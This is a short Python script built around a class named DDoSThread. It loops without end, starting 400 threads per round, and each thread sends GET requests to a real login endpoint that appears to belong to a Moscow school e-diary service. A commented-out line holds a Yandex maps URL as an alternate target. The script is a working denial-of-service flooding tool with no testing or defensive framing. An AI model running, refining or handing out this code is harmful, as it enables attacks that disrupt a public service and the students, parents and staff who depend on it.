from threading import Thread
import requests
# import speedtest

# st = speedtest.Speedtest()
threads = []
alive_threads = 0


class DDoSThread(Thread):
    def __init__(self, name, function, href, **params):
        Thread.__init__(self)
        self.name = name
        self.test = True
        self.function = function
        self.href = href
        self.params = params
        self.res = None

    def run(self):
        global alive_threads
        if self.test:
            alive_threads += 1
            # print(f"{self.name} run")
        if self.params != {}:
            self.res = self.function(self.href, self.params)
        else:
            self.res = self.function(self.href)
        if self.test:
            alive_threads -= 1
            # print(f"{self.name} died")


def response_image(href, params):
    return requests.get(href, params=params)


def response_image2(href):
    return requests.get(href)


def response_image3():
    return requests.get(
        "https://static-maps.yandex.ru/1.x/?ll=37.677751,55.757718&spn=0.016457,0.00619&l=map&size=400,400")


count = 400
while True:
    for i in range(count):
        # s = "https://static-maps.yandex.ru/1.x/?ll=37.677751,55.757718&spn=0.016457,0.00619&l=map&size=400,400"
        s = "https://dnevnik.mos.ru/aupd/auth"
        th = DDoSThread(f"{i + 1} thread", response_image2, s)
        print(f"\rAlive threads: {alive_threads}", end="")
        threads.append(th)
        th.start()
    for i in range(len(threads) - 1, -1, -1):
        print(f"\rAlive threads: {alive_threads}", end="")
        threads[i].join(3)
        threads.pop(i)
    threads = []
